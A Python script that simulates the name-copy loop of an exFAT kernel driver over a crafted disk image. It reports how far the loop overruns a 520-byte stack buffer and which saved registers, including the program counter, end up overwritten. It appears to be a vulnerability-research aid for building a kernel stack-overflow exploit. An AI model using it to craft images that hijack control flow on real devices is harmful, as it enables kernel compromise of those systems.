#!/usr/bin/env python3
"""Replay exfat_get_uni_name_from_ext_entry()'s copy loop over a crafted image
and print what actually lands in the caller's frame.

Mirrors the shipped binary exactly (exfat_core.ko .text+0x1bc4):
  end   = uniname + 30*(num_ext-1)
  each iteration: copy up to 15 halfwords from dentry+2, stop that fragment on
  a 0x0000 halfword (which IS stored), else store a 0x0000 terminator at
  uniname+30; then uniname += 30.

Usage: simloop.py IMG [--slot N]
"""
import argparse
import struct

SECTOR = 512
DENTRY = 32
# ffsReadDir frame (exfat_core.ko .text+0x2670): uniname = fp-560,
# epilogue `sub sp,fp,#40; ldm sp,{r4,r5,r6,r7,r8,r9,sl,fp,sp,pc}`.
SLOTS = [(520, 'r4'), (524, 'r5'), (528, 'r6'), (532, 'r7'), (536, 'r8'),
         (540, 'r9'), (544, 'sl'), (548, 'fp'), (552, 'sp'), (556, 'pc')]

ap = argparse.ArgumentParser()
ap.add_argument('img')
ap.add_argument('--slot', type=int, default=None, help='root slot of the 0x85 file dentry')
a = ap.parse_args()

d = open(a.img, 'rb').read()
heap = struct.unpack_from('<I', d, 88)[0]
root = struct.unpack_from('<I', d, 96)[0]
fat_off = struct.unpack_from('<I', d, 80)[0]
sps = 1 << d[109]
clu_size = sps * SECTOR


def clu_off(c):
    return (heap + (c - 2) * sps) * SECTOR


def fat(c):
    return struct.unpack_from('<I', d, fat_off * SECTOR + c * 4)[0]


# flatten the root chain
chain, c = [], root
while c != 0xFFFFFFFF and len(chain) < 64:
    chain.append(c)
    c = fat(c)
flat = b''.join(d[clu_off(c):clu_off(c) + clu_size] for c in chain)

slot = a.slot
if slot is None:
    for i in range(len(flat) // DENTRY):
        if flat[i * DENTRY] == 0x85:
            slot = i
            break
if slot is None:
    raise SystemExit("no 0x85 file dentry in root")

num_ext = flat[slot * DENTRY + 1]
print("root chain %s, file dentry at slot %d, num_ext=%d" % (chain, slot, num_ext))

buf = bytearray(4096)
touched = bytearray(4096)
uni = 0
end = 30 * (num_ext - 1)
i = 1
while i < num_ext:
    ep = (slot + 1 + i) * DENTRY          # +1 file, +1 stream => names at slot+2..
    typ = flat[ep]
    if typ != 0xC1:
        print("  iteration %d: dentry type 0x%02x != 0xC1 -> loop bails (faulty_entry)" % (i, typ))
        break
    for j in range(15):
        v = struct.unpack_from('<H', flat, ep + 2 + j * 2)[0]
        struct.pack_into('<H', buf, uni + j * 2, v)
        touched[uni + j * 2] = touched[uni + j * 2 + 1] = 1
        if v == 0:
            break
    else:
        struct.pack_into('<H', buf, uni + 30, 0)
        touched[uni + 30] = touched[uni + 31] = 1
    uni += 30
    i += 1

print("  iterations run = %d, bytes spanned = %d (buffer is 520 B)" % (i - 1, uni))
print("  overflow past uni_name = %d bytes" % max(0, uni - 520))
for off, name in SLOTS:
    w = struct.unpack_from('<I', buf, off)[0]
    t = 'written' if all(touched[off:off + 4]) else 'PARTIAL/untouched'
    print("    +%-4d saved %-3s = 0x%08x   (%s)" % (off, name, w, t))
